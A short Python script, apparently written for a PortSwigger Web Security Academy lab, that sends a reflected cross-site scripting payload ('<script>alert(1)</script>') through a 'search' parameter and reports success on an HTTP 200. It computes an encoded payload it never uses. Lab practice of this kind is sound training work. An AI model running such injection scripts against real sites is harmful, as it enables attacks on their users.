import requests
from requests.utils import quote

def inject(url,payload):
    encoded_payload = quote(payload)
    exploit_url = f"{url}?search={payload}"
    headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
    }
    try:
        response = requests.get(exploit_url, headers=headers)
        if response.status_code == 200:
            print("Start inject")
            print(f"Status of server: {response.status_code}")
            print("exploit success delivered!")
            print(f"text: {response.text[:200]}") 
        else:
            print(f"error: {response.status_code}")
    except requests.RequestException as error:
        print(f"Error: {error}")
        
if __name__ == "__main__":
    target_url = "https://0a670032032e9dbe81686182007b00a0.web-security-academy.net/"
    xsspayload = "<script>alert(1)</script>"
    
inject(target_url, xsspayload)
